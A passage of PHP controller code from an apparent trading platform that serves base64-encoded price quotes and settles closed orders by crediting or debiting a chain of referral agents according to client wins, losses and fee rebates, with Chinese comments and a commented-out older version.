            $_state = 'down';
        } else {
            $_state = 'up';
        }
        $all_data['topdata'] = array(
            'topdata' => $pro['UpdateTime'],
            'now' => $pro['Price'],
            'open' => $pro['Open'],
            'lowest' => $pro['Low'],
            'highest' => $pro['High'],
            'close' => $pro['Close'],
            'state' => $_state
        );
        $all_data['items'] = $res_arr;
        if ($isres) {
            return (json_encode($all_data));
        } else {
            exit(json_encode(base64_encode(json_encode($all_data))));
        }
    }

    public function getprodata() {
        $pid = input('param.pid');
        $pro = GetProData($pid);
        if (!$pro) {
            exit;
        }

        $topdata = array(
            'topdata' => $pro['UpdateTime'],
            'now' => $pro['Price'],
            'open' => $pro['Open'],
            'lowest' => $pro['Low'],
            'highest' => $pro['High'],
            'close' => $pro['Close']
        );
        exit(json_encode(base64_encode(json_encode($topdata))));
    }

    /**
     * 分配订单
     * @return [type] [description]
     */
    public function allotorder() {
        //查找以平仓未分配的订单  isshow字段
        $map['isshow'] = 0;
        $map['ostaus'] = 1;
        $map['selltime'] = array('<', time() - 60);
        $list = db('order')->where($map)->limit(0, 10)->select();
        if (!$list) {
            //return false;
          exit;
        }

        foreach ($list as $k => $v) {
            //分配金额
            $this->allotfee($v['uid'], $v['fee'], $v['is_win'], $v['oid'], $v['ploss']);
            //更改订单状态
            db('order')->where('oid', $v['oid'])->update(array('isshow' => 1));
        }
    }

  
    public function allotfee($uid, $fee, $is_win, $order_id, $ploss) {
        $userinfo = db('userinfo');
        $allot = db('allot');
        $nowtime = time();

        $user = $userinfo->field('uid,oid')->where('uid', $uid)->find();
        $myoids = myupoid($user['oid']);
        if (!$myoids) {
            return;
        }
        //红利
        $_fee = 0;
        //佣金
        $_feerebate = 0;
        //手续费
        $web_poundage = getconf('web_poundage');
        //分配金额
        if ($is_win == 1) {
            $pay_fee = $ploss;
        } elseif ($is_win == 2) {
            $pay_fee = $fee;
        } else {
            return;
        }


        foreach ($myoids as $k => $v) {

            if ($user['oid'] == $v['uid']) { //直接推荐者拿自己设置的比例
                $_fee = round($pay_fee * ($v["rebate"] / 100), 2);
                $_feerebate = round($fee * $web_poundage / 100 * ($v["feerebate"] / 100), 2);
                echo $_feerebate;
            } else {  //他上级比例=本级-下级比例
                $_my_rebate = ($v["rebate"] - $myoids[$k - 1]["rebate"]);

                if ($_my_rebate < 0)
                    $_my_rebate = 0;
                $_fee = round($pay_fee * ( $_my_rebate / 100), 2);

                $_my_feerebate = ($v["feerebate"] - $myoids[$k - 1]["feerebate"] );
                if ($_my_feerebate < 0)
                    $_my_feerebate = 0;
                $_feerebate = round($fee * $web_poundage / 100 * ( $_my_feerebate / 100), 2);
            }


            //红利
            if ($is_win == 1) { //客户盈利代理亏损
                if ($_fee != 0) {
                    $ids_fee = $userinfo->where('uid', $v['uid'])->setDec('usermoney', $_fee);
                } else {
                    $ids_fee = null;
                }

                $type = 2;
                $_fee = $_fee * -1;
            } elseif ($is_win == 2) { //客户亏损代理盈利
                if ($_fee != 0) {
                    $ids_fee = $userinfo->where('uid', $v['uid'])->setInc('usermoney', $_fee);
                } else {
                    $ids_fee = null;
                }

                $type = 1;
            } elseif ($is_win == 3) { //无效订单不做操作
                $ids_fee = null;
            }

            if ($ids_fee) {
                //余额
                $nowmoney = $userinfo->where('uid', $v['uid'])->value('usermoney');
                set_price_log($v['uid'], $type, $_fee, '对冲', '下线客户平仓对冲', $order_id, $nowmoney);
            }

            //手续费
            if ($_feerebate != 0) {
                $ids_feerebate = $userinfo->where('uid', $v['uid'])->setInc('usermoney', $_feerebate);
            } else {
                $ids_feerebate = null;
            }

            if ($ids_feerebate) {
                //余额
                $nowmoney = $userinfo->where('uid', $v['uid'])->value('usermoney');
                set_price_log($v['uid'], 1, $_feerebate, '客户手续费', '下线客户下单手续费', $order_id, $nowmoney);
            }
        }

        /*

          foreach ($myoids as $k => $v) {
          //分红利
          if($_fee <= 0){
          continue;
          }

          if($v['rebate'] <= 0 || $v['rebate'] > 100){
          continue;
          }

          //分给我的钱
          $my_fee = round($_fee*(100-$v['rebate'])/100,2);

          if($my_fee <= 0.01){
          continue;
          }


          if($is_win == 1){	//客户盈利代理亏损
          $ids = $userinfo->where('uid',$v['uid'])->setDec('usermoney', $my_fee);
          $type = 2;
          $my_fee = $my_fee*-1;
          }elseif($is_win == 2){	//客户亏损代理盈利

          $ids = $userinfo->where('uid',$v['uid'])->setInc('usermoney', $my_fee);
          $type = 1;
          }elseif($is_win == 3){	//无效订单不做操作
          $ids = null;
          }
          //余额
          $nowmoney = $userinfo->where('uid',$v['uid'])->value('usermoney');

          if($ids){
          $_data['is_win'] = $is_win;
          $_data['time'] = $nowtime;
          $_data['uid'] = $v['uid'];
          $_data['order_id'] = $order_id;
          $_data['my_fee'] = $my_fee;
          $_data['nowmoney'] = $nowmoney;
          $_data['type'] = 1;
          $allot->insert($_data);

          set_price_log($v['uid'],$type,$my_fee,'对冲','下线客户平仓对冲',$order_id,$nowmoney);
          }

          $_fee = round($_fee*$v['rebate']/100,2);


          }

          //分佣金
          foreach ($myoids as $k => $v) {


          if($yj_fee <= 0){
          continue;
          }

          if($v['feerebate'] <= 0 || $v['feerebate'] > 100){
          continue;
          }

          //分给我的钱
          $my_fee = round($yj_fee*(100-$v['feerebate'])/100,2);

          if($my_fee <= 0.01){
          continue;
          }

          //余额
          $nowmoney = $userinfo->where('uid',$v['uid'])->value('usermoney');
          if($is_win == 1 || $is_win == 2){	//有效订单
          $ids = $userinfo->where('uid',$v['uid'])->setInc('usermoney', $my_fee);
          $type = 1;
          }else{
          $ids = null;
          }
          if($ids){
          $_data['is_win'] = $is_win;
          $_data['time'] = $nowtime;
          $_data['uid'] = $v['uid'];
          $_data['order_id'] = $order_id;
          $_data['my_fee'] = $my_fee;
          $_data['nowmoney'] = $nowmoney;
          $_data['type'] = 2;
          $allot->insert($_data);

          set_price_log($v['uid'],$type,$my_fee,'客户手续费','下线客户下单手续费',$order_id,$nowmoney);
          }

          $yj_fee = round($yj_fee*$v['feerebate']/100,2);

          }
         */
    }

}

?>